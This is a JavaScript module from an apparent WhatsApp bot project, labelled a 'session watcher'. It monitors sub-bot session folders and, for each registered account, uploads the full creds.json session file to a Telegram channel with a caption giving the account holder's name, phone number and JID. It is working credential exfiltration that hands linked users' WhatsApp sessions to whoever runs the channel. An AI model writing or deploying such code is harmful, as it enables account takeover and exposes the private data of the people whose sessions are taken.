/**
 * ═══════════════════════════════════════════════════════
 * 👁️ SESSION WATCHER | مراقب الجلسات الذكي
 * ═══════════════════════════════════════════════════════
 * 👑 المطور: آدم (شادو) | Adam (Shadow)
 * 📜 الوصف: يراقب جلسات البوتات الفرعية ويرسلها للتليجرام
 * ═══════════════════════════════════════════════════════
 */

import { Telegraf } from 'telegraf';
import fs from 'fs';
import path from 'path';
import chokidar from 'chokidar';
import chalk from 'chalk';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const SESSIONS_DIR = path.join(__dirname, '..', 'sessions', 'session-sub');
const PROCESSED_SESSIONS = new Set(); // لتتبع الجلسات المُرسلة

// إعدادات التليجرام (يمكن تحميلها من .env أو settings.json)
const TELEGRAM_CONFIG = {
  botToken: process.env.TG_BOT_TOKEN || '', // توكن بوت التليجرام
  channelId: process.env.TG_CHANNEL_ID || '', // معرف القناة/الجروب
  checkInterval: 10000 // 10 ثواني
};

let tgBot = null;

/**
 * بدء مراقب الجلسات
 */
export async function startSessionWatcher() {
  console.log(chalk.cyan('[WATCHER] 🚀 بدء مراقب الجلسات...'));

  // ضمان وجود المجلد
  if (!fs.existsSync(SESSIONS_DIR)) {
    fs.mkdirSync(SESSIONS_DIR, { recursive: true });
  }

  // بدء بوت التليجرام
  if (TELEGRAM_CONFIG.botToken) {
    try {
      tgBot = new Telegraf(TELEGRAM_CONFIG.botToken);
      await tgBot.telegram.getMe();
      console.log(chalk.green('[WATCHER] ✅ بوت التليجرام متصل'));
    } catch (err) {
      console.error(chalk.red('[WATCHER] ❌ فشل اتصال التليجرام:'), err.message);
      tgBot = null;
    }
  } else {
    console.log(chalk.yellow('[WATCHER] ⚠️ لا يوجد توكن تليجرام، لن يتم إرسال الجلسات'));
  }

  // مراقبة المجلد باستخدام chokidar
  const watcher = chokidar.watch(SESSIONS_DIR, {
    persistent: true,
    ignoreInitial: false,
    depth: 1
  });

  watcher.on('add', async (filePath) => {
    const fileName = path.basename(filePath);
    const dirName = path.basename(path.dirname(filePath));
    
    // نتحقق فقط من ملفات creds.json
    if (fileName === 'creds.json' && dirName !== 'session-sub') {
      await handleNewSession(dirName, filePath);
    }
  });

  // فحص دوري كاحتياط
  setInterval(() => {
    scanExistingSessions();
  }, TELEGRAM_CONFIG.checkInterval);

  console.log(chalk.green('[WATCHER] ✅ مراقب الجلسات نشط'));
}

/**
 * التعامل مع جلسة جديدة
 */
async function handleNewSession(sessionId, credsPath) {
  // تجنب التكرار
  if (PROCESSED_SESSIONS.has(sessionId)) {
    return;
  }

  try {
    const creds = JSON.parse(fs.readFileSync(credsPath, 'utf-8'));
    
    // تأكد أن الجلسة مسجلة
    if (!creds.registered) {
      console.log(chalk.yellow(`[WATCHER] ⏳ الجلسة ${sessionId} غير مسجلة بعد`));
      return;
    }

    console.log(chalk.green(`[WATCHER] 🆕 جلسة جديدة: ${sessionId}`));
    PROCESSED_SESSIONS.add(sessionId);

    // إرسال للتليجرام
    if (tgBot && TELEGRAM_CONFIG.channelId) {
      await sendSessionToTelegram(sessionId, creds, credsPath);
    }

    // حفظ في قاعدة البيانات المحلية (اختياري)
    updateLocalDatabase(sessionId, creds);

  } catch (err) {
    console.error(chalk.red(`[WATCHER] ❌ خطأ في معالجة الجلسة ${sessionId}:`), err.message);
  }
}

/**
 * إرسال الجلسة للتليجرام
 */
async function sendSessionToTelegram(sessionId, creds, credsPath) {
  try {
    const userName = creds.me?.name || 'Unknown';
    const userJid = creds.me?.id || sessionId;
    const phoneNumber = sessionId.replace(/\D/g, '');

    const caption = [
      '🕸 *جلسة بوت فرعي جديدة!*',
      '',
      `👤 *الاسم:* ${userName}`,
      `📱 *الرقم:* ${phoneNumber}`,
      `🆔 *JID:* ${userJid}`,
      `📅 *التاريخ:* ${new Date().toLocaleString('ar-EG')}`,
      '',
      '⚠️ *تحذير:* لا تشارك هذا الملف مع أي شخص!'
    ].join('\n');

    // إرسال الملف
    await tgBot.telegram.sendDocument(
      TELEGRAM_CONFIG.channelId,
      { source: fs.readFileSync(credsPath) },
      {
        caption,
        parse_mode: 'Markdown',
        filename: `${sessionId}_creds.json`
      }
    );

    console.log(chalk.green(`[WATCHER] ✅ تم إرسال الجلسة ${sessionId} للتليجرام`));

  } catch (err) {
    console.error(chalk.red('[WATCHER] ❌ فشل إرسال للتليجرام:'), err.message);
  }
}

/**
 * فحص الجلسات الموجودة (كاحتياط)
 */
async function scanExistingSessions() {
  if (!fs.existsSync(SESSIONS_DIR)) return;

  const dirs = fs.readdirSync(SESSIONS_DIR);
  for (const dir of dirs) {
    const credsPath = path.join(SESSIONS_DIR, dir, 'creds.json');
    if (fs.existsSync(credsPath) && !PROCESSED_SESSIONS.has(dir)) {
      await handleNewSession(dir, credsPath);
    }
  }
}

/**
 * تحديث قاعدة البيانات المحلية (اختياري)
 */
function updateLocalDatabase(sessionId, creds) {
  const dbPath = path.join(__dirname, '..', 'sessions', 'sessions-db.json');
  
  let db = {};
  if (fs.existsSync(dbPath)) {
    try {
      db = JSON.parse(fs.readFileSync(dbPath, 'utf-8'));
    } catch {}
  }

  db[sessionId] = {
    name: creds.me?.name,
    jid: creds.me?.id,
    createdAt: new Date().toISOString(),
    registered: creds.registered
  };

  fs.writeFileSync(dbPath, JSON.stringify(db, null, 2));
}